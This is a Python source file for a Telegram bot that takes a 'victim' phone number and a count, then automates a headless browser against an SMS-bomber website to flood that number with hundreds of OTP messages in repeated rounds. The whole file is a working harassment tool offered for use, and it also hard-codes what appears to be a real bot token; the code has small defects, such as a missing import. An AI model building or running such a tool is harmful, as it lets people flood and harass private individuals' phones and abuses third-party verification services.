import telebot
import time
import requests
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.common.by import By

Bot_Token = "1702684382:AAFUZxoAdNy6TItR5gknWpgj3mj0bLYtvS8"

bot = telebot.TeleBot(Bot_Token, parse_mode=None) # You can set parse_mode by default. HTML or MARKDOWN


user_dict = {}


class User:
    def __init__(self, mobile_number):
        self.mobile_number = mobile_number
        self.count = None


@bot.message_handler(commands=['start','help'])
def send_welcome(message):
    text_to_send= "Wel-Come To Unlimited SMS-Sending Bot !! \n \n This Bot Is Automatically Sending unlimited Number Of Sms No Need To Active On Bot \n \n Just Enter The Victime Number : "
    bot.register_next_step_handler(bot.send_message(message.chat.id , text_to_send), process_mobile_number_step)


def process_mobile_number_step(message):
    try:
        chat_id = message.chat.id
        mobile_number = message.text
        if len(mobile_number) ==10:
            user = User(mobile_number)
            user_dict[chat_id] = user
            msg = bot.reply_to(message, 'How SMS You Want To Send ? \n \n Note That :- If You Enter 5 Will Send 100 SMS And Then Wait For 5 Minute After 5 Minutes AGain We Will Send 100 SMS Then Again Wait For 5 Minute This Proccess Will Run 5 Time As You Have Entered 5 So 5*500 OTP Will Be Send  !! \n \n If You Want To Test Just Put 2 ')
            bot.register_next_step_handler(msg, process_count_step)
        else:
            ms=bot.send_message(chat_id, "Please Enter A Valid 10 Digit Mobile Number")
            bot.register_next_step_handler(ms, process_mobile_number_step)
    except Exception as e:
        bot.reply_to(message, 'oooops')



def process_count_step(message):
    try:
        chat_id = message.chat.id
        count = message.text
        user = user_dict[chat_id]
        user.count = count
        ms=bot.send_message(chat_id, 'We Will Start Sending SMS To : ' + user.mobile_number + '\n Count:' + str(user.count)+"\n \n Type 'YES' To Continue Or 'NO' Exit")
        bot.register_next_step_handler(ms, process_sms_step)
    except Exception as e:
        bot.reply_to(message,'oooops')

def process_sms_step(message):
    chat_id = message.chat.id
    check = message.text
    if check == "YES":
        user = user_dict[chat_id]
        chrome_options = webdriver.ChromeOptions()
        chrome_options.binary_location = os.environ.get("GOOGLE_CHROME_BIN")
        chrome_options.add_argument("--headless")
        chrome_options.add_argument("--disable-dev-shm-usage")
        chrome_options.add_argument("--no-sandbox")
        driver = webdriver.Chrome(executable_path=os.environ.get("CHROMEDRIVER_PATH"), options=chrome_options)
        browser = webdriver.Chrome(executable_path=r"C:\Chrome_driver\chromedriver.exe")  # Creating Object Of Chrome  && executable_path=r"C:\path\to\chromedriver.exe"
        no_otp = 100
        time.sleep(10)
        for i in range(1,int(user.count)+1):
            browser.get("https://mytoolstown.com/smsbomber/")
            mobile_number_input = browser.find_element_by_css_selector("input[id='mobno']").send_keys(user.mobile_number)
            time.sleep(3)
            count_input = browser.find_element_by_css_selector("input[id='count']").send_keys(no_otp)
            count_input = browser.find_element(By.XPATH,"//*[@id='sendsms']/div[3]/div/div/div[3]/label").click()
            time.sleep(3)
            submit_button = browser.find_element_by_xpath("//*[@id='startsms']").click()
            time.sleep(120)
            browser.refresh()
            bot.send_message(chat_id,"Sended OTP 100*"+str(i)+"="+str(i*100)+"Times Now Waiting For 5-10 Minutes")
            time.sleep(300)
        browser.close()
        bot.send_message(chat_id,"Proccess IS Completed !!")
    else:
        bot.send_message(chat_id,"Canceled The Proccess")

bot.polling()